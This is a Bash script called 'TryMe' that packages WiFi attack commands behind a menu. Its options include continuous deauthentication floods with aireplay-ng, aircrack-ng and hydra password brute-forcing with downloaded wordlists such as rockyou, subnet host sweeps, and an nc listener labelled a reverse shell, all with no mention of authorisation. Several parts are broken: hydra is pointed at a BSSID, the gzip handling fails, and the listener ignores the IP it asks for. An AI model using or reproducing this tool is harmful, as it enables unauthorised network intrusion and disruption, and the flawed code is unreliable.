#!/bin/bash

# Script Name: tryme
# Developer: Suleiman Yahaya Garo aka Garogenius


function install_dependencies() {
    if [[ -n "$(command -v termux-info)" ]]; then
        # If running on Termux
        echo "Detected Termux. Installing dependencies..." | lolcat
        pkg update -y
        pkg install wget nmap hydra termux-api lolcat figlet -y
    else
        # If running on Linux
        echo "Detected Linux. Installing dependencies..." | lolcat
        sudo apt update
        sudo apt install aircrack-ng nmap wget hydra lolcat figlet wireless-tools -y
    fi
}

function check_root() {
    if [[ -z "$(command -v termux-info)" && $EUID -ne 0 ]]; then
        echo "This script must be run as root!" | lolcat
        exit 1
    fi
}

install_dependencies


check_root

figlet "               ***TryMe***" | lolcat
echo "                    Developed by Suleiman Yahaya Garo aka Garogenius" | lolcat


declare -A wordlists
wordlists["1"]="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
wordlists["2"]="https://crackstation.net/files/crackstation.txt.gz"
wordlists["3"]="https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt"

function select_wordlist() {
    echo "Select a wordlist to download:" | lolcat
    PS3="Enter your choice (1-3): "
    options=("rockyou.txt (Large, Common)" "crackstation.txt.gz (Very Large, Comprehensive)" "top-20-common-SSH-passwords.txt (Small, Fast)")
    select opt in "${options[@]}"; do
        case $REPLY in
            1) wordlist_url="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"; break ;;
            2) wordlist_url="https://crackstation.net/files/crackstation.txt.gz"; break ;;
            3) wordlist_url="https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt"; break ;;
            *) echo "Invalid option, please try again." ;;
        esac
    done
    echo "Downloading wordlist..." | lolcat
    wget -O /tmp/wordlist.txt "$wordlist_url"


    if [[ "$wordlist_url" == *.gz ]]; then
        echo "Decompressing wordlist..." | lolcat
        gunzip /tmp/wordlist.txt.gz
    fi
    echo "/tmp/wordlist.txt"
}

function search_networks() {
    echo "Searching for available networks..." | lolcat
    if [[ -n "$(command -v termux-info)" ]]; then
        termux-wifi-scaninfo | lolcat
    else
        nmcli device wifi list | lolcat
    fi
}

function start_monitor_mode() {
    if [[ -n "$(command -v termux-info)" ]]; then
        echo "Monitor mode is not supported on Termux." | lolcat
    else
        echo "Starting monitor mode on wireless interface..." | lolcat
        interface=$(iw dev | awk '$1=="Interface"{print $2}')
        if [[ -z "$interface" ]]; then
            echo "No wireless interface found. Please check your setup." | lolcat
            exit 1
        fi
        
        echo "Found wireless interface: $interface" | lolcat
        ifconfig "$interface" down
        airmon-ng start "$interface"
        
        mon_interface="${interface}mon"
        if ifconfig "$mon_interface" up; then
            echo "Monitor mode enabled on $mon_interface" | lolcat
            airodump-ng "$mon_interface"
        else
            echo "Failed to start monitor mode. Check if your adapter supports it." | lolcat
            exit 1
        fi
    fi
}

function brute_force_wifi() {
    echo "Attempting to brute-force WiFi network..." | lolcat
    read -p "Enter target network BSSID: " bssid

    echo "Select wordlist to work with...." | lolcat

    wordlist_path=$(select_wordlist)

    if [[ -n "$(command -v termux-info)" ]]; then
        echo "Launching brute-force attack using hydra..." | lolcat
        pkg install hydra -y
        hydra -l admin -P "$wordlist_path" "$bssid" http-get
    else
        xterm -e "aireplay-ng --deauth 0 -a $bssid wlan0mon" &
        aircrack-ng -b $bssid -w "$wordlist_path" wlan0mon
    fi
}

function connected_devices() {
    echo "Listing devices connected to the network..." | lolcat
    gateway_ip=$(ip route | grep default | awk '{print $3}')
    nmap -sn "$gateway_ip"/24 | grep "Nmap scan report for" | lolcat
}

function restart_network() {
    echo "Restarting network interface..." | lolcat
    if [[ -n "$(command -v termux-info)" ]]; then
        termux-wifi-enable false
        sleep 2
        termux-wifi-enable true
    else
        nmcli radio wifi off
        sleep 2
        nmcli radio wifi on
    fi
    echo "Network restarted." | lolcat
}


function reverse_shell() {
    echo "Setting up reverse shell..." | lolcat
    read -p "Enter IP to connect back to: " attacker_ip
    read -p "Enter port to connect: " port
    figlet "Access Granted" | lolcat
    echo "Starting listener on $attacker_ip:$port..." | lolcat
    nc -lvnp "$port"
}


while true; do
    echo "*********************************************************" | lolcat
    echo "                  End Session" | lolcat
    echo "*********************************************************" | lolcat
    figlet "TryMe Tool" | lolcat
    echo "Developed by Suleiman Yahaya Garo aka Garogenius" | lolcat
    echo "Select an option:" | lolcat
    echo "1. Search for Online WiFi Networks" | lolcat
    echo "2. Start Monitor Mode & Search Networks (Linux only)" | lolcat
    echo "3. Brute-force WiFi Network" | lolcat
    echo "4. List Connected Devices" | lolcat
    echo "5. Restart Network Interface" | lolcat
    echo "6. Setup Reverse Shell" | lolcat
    echo "7. Exit" | lolcat
    read -p "Enter your choice: " choice

    case $choice in
        1) search_networks ;;
        2) start_monitor_mode ;;
        3) brute_force_wifi ;;
        4) connected_devices ;;
        5) restart_network ;;
        6) reverse_shell ;;
        7) exit 0 ;;
        *) echo "Invalid choice, please try again." | lolcat ;;
    esac
done
